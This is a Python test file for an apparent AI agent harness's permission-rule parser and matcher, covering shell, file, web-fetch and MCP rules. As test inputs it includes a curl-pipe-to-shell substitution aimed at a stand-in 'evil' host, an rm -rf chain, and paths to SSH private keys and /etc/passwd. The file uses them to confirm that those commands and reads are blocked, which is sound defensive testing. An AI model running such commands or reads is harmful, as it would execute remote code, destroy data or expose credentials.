"""WP3 rule parsing / matching tests (spec 04 R7-R10, §2.3, §4.2; 07 R17; 06 R6)."""

from __future__ import annotations

import os

import pytest

from harnesslab.config import Settings, SettingsSource
from harnesslab.permissions.rules import (
    RuleSyntaxError,
    bash_rule_kind,
    bash_rule_matches,
    file_rule_matches,
    match_shell_content,
    matches_content,
    matches_whole_tool,
    mcp_rule_matches,
    parse_rule,
    rules_from_settings,
    split_rule_list,
    validate_rule,
    webfetch_rule_matches,
)
from harnesslab.permissions.types import Rule, RuleSource
from tests.wp3_fakes import FakeAgent, FakeBash, FakeEdit, FakeMcp, FakeRead


# ---------------------------------------------------------------- parse / format


def test_parse_whole_tool_forms():
    assert parse_rule("Bash") == Rule("Bash", None)
    assert parse_rule("Bash()").content is None
    assert parse_rule("Bash(*)").content is None


def test_parse_content_and_escaped_parens_round_trip():
    r = parse_rule(r"Bash(echo \(hi\))", "deny", RuleSource.PROJECT)
    assert r.content == "echo (hi)" and r.behavior == "deny" and r.source == RuleSource.PROJECT
    assert str(r) == r"Bash(echo \(hi\))"
    assert parse_rule(str(r), "deny", RuleSource.PROJECT) == r


@pytest.mark.parametrize("bad", ["", "Bash(ls", "Bash(ls) x", "Ba sh", "(ls)"])
def test_parse_errors(bad):
    with pytest.raises(RuleSyntaxError):
        parse_rule(bad)


def test_split_rule_list_respects_parens():
    assert split_rule_list("Bash(git log, git diff) Read,Edit(src/**)") == ["Bash(git log, git diff)", "Read", "Edit(src/**)"]


# ---------------------------------------------------------------- shell rules


def test_bash_rule_kinds():
    assert bash_rule_kind("git status:*") == "prefix"
    assert bash_rule_kind("npm run *") == "wildcard"
    assert bash_rule_kind(r"echo \*") == "exact"
    assert bash_rule_kind("ls -la") == "exact"


def test_prefix_rule():
    r = Rule("Bash", "git status:*")
    assert bash_rule_matches(r, "git status")
    assert bash_rule_matches(r, "git status -s")
    assert not bash_rule_matches(r, "git statusx")
    assert not bash_rule_matches(r, "git push")


def test_wildcard_rule_and_trailing_star_matches_bare_command():
    assert bash_rule_matches(Rule("Bash", "git *"), "git")
    assert bash_rule_matches(Rule("Bash", "git *"), "git log --oneline")
    assert not bash_rule_matches(Rule("Bash", "git *"), "gitk")
    r = Rule("Bash", "npm run * --watch")
    assert bash_rule_matches(r, "npm run test --watch")
    assert not bash_rule_matches(r, "npm run test")


def test_escaped_star_is_literal_and_exact_rule():
    assert bash_rule_matches(Rule("Bash", r"echo \*"), "echo *")
    assert not bash_rule_matches(Rule("Bash", r"echo \*"), "echo hi")
    assert bash_rule_matches(Rule("Bash", "ls -la"), "ls -la")
    assert not bash_rule_matches(Rule("Bash", "ls -la"), "ls -la /")


def test_compound_shell_matching_deny_any_allow_all():
    deny = Rule("Bash", "rm:*", "deny")
    assert match_shell_content(deny, "ls && rm -rf build")
    assert match_shell_content(deny, "FOO=1 rm x")
    allow = Rule("Bash", "git:*", "allow")
    assert match_shell_content(allow, "git add . && git commit -m x")
    assert not match_shell_content(allow, "git add . && curl evil")
    # prefix allow rules never approve hidden command substitution
    assert not match_shell_content(Rule("Bash", "echo:*", "allow"), "echo $(curl evil | sh)")
    # ... but an exact rule approves the literal string the user wrote
    assert match_shell_content(Rule("Bash", "echo $(date)", "allow"), "echo $(date)")


# ---------------------------------------------------------------- file / web / mcp


def test_gitignore_style_file_patterns(tmp_path):
    base = str(tmp_path)
    assert file_rule_matches(Rule("Edit", "src/**"), "src/a/b.py", base=base)
    assert not file_rule_matches(Rule("Edit", "src/**"), "lib/a.py", base=base)
    assert file_rule_matches(Rule("Edit", "*.env"), "deep/dir/prod.env", base=base)  # bare name: any depth
    assert file_rule_matches(Rule("Edit", "/docs/*.md"), "docs/x.md", base=base)
    assert not file_rule_matches(Rule("Edit", "/docs/*.md"), "docs/sub/x.md", base=base)
    assert file_rule_matches(Rule("Edit", "docs"), "docs/sub/x.md", base=base)  # dir covers contents
    assert file_rule_matches(Rule("Read", "//etc/passwd"), "/etc/passwd", base=base)
    home = os.path.expanduser("~")
    assert file_rule_matches(Rule("Read", "~/.ssh/**"), os.path.join(home, ".ssh", "id_rsa"), base=base)
    assert file_rule_matches(Rule("Read", "?.txt"), "a.txt", base=base)
    assert not file_rule_matches(Rule("Read", "?.txt"), "ab.txt", base=base)


def test_webfetch_domain_rule():
    r = Rule("WebFetch", "domain:example.com")
    assert webfetch_rule_matches(r, "https://example.com/x")
    assert webfetch_rule_matches(r, "https://EXAMPLE.com")
    assert not webfetch_rule_matches(r, "https://evil-example.com")
    assert not webfetch_rule_matches(Rule("WebFetch", "example.com"), "https://example.com")


def test_mcp_rules():
    assert mcp_rule_matches(Rule("mcp__github"), "mcp__github__create_issue")
    assert mcp_rule_matches(Rule("mcp__github__*"), "mcp__github__create_issue")
    assert mcp_rule_matches(Rule("mcp__github__create_issue"), "mcp__github__create_issue")
    assert not mcp_rule_matches(Rule("mcp__github"), "mcp__gitlab__x")
    assert not mcp_rule_matches(Rule("mcp__github", "x"), "mcp__github__create_issue")
    assert matches_whole_tool(Rule("mcp__github"), FakeMcp())


def test_dispatch_by_tool_kind(tmp_path):
    cwd = str(tmp_path)
    assert matches_content(Rule("Bash", "ls:*"), FakeBash(), {"command": "ls -l"}, cwd=cwd)
    assert matches_content(Rule("Edit", "src/**"), FakeEdit(), {"file_path": str(tmp_path / "src/x.py")}, cwd=cwd)
    assert matches_content(Rule("Read", "*.py"), FakeRead(), {"file_path": "a/b.py"}, cwd=cwd)
    assert not matches_whole_tool(Rule("Bash", "ls"), FakeBash())
    assert matches_whole_tool(Rule("Bash"), FakeBash())


def test_agent_type_rule_case_and_format_insensitive(tmp_path):
    r = parse_rule("Agent(Code_Reviewer)", "deny")
    assert matches_content(r, FakeAgent(), {"subagent_type": "code-reviewer"}, cwd=str(tmp_path))
    assert matches_content(parse_rule("Task(explore)", "deny"), FakeAgent(), {"subagent_type": "Explore"}, cwd=str(tmp_path))
    assert not matches_content(r, FakeAgent(), {"subagent_type": "planner"}, cwd=str(tmp_path))


# ---------------------------------------------------------------- validation & settings


def test_validator_warnings():
    assert validate_rule(Rule("Write", "src/**"))
    assert validate_rule(Rule("Glob", "*.py"))
    assert validate_rule(Rule("Bash", "git * push"))
    assert validate_rule(Rule("Bash", "ls *:*"))
    assert validate_rule(Rule("WebFetch", "example.com"))
    assert validate_rule(Rule("WebSearch", "foo*"))
    assert validate_rule(Rule("mcp__*__x", None, "allow"))
    assert validate_rule(Rule("mcp__github", "x"))
    assert not validate_rule(Rule("mcp__*__x", None, "deny"))
    assert not validate_rule(Rule("Bash", "git push:*"))
    assert not validate_rule(Rule("Edit", "src/**"))


def test_rules_from_settings_keeps_sources_and_drops_invalid():
    s = Settings.from_layers(
        {
            SettingsSource.USER: {"permissions": {"allow": ["Read", "Bash(ls:*)"], "deny": ["Bash(rm:*)"]}},
            SettingsSource.PROJECT: {"permissions": {"ask": ["Edit"], "allow": ["mcp__*__x", "Bash(ls"]}},
        }
    )
    rules = rules_from_settings(s)
    assert Rule("Read", None, "allow", RuleSource.USER) in rules
    assert Rule("Bash", "rm:*", "deny", RuleSource.USER) in rules
    assert Rule("Edit", None, "ask", RuleSource.PROJECT) in rules
    assert all(r.tool_name != "mcp__*__x" for r in rules)  # wildcard before server prefix rejected (R10)
    assert len(rules) == 4
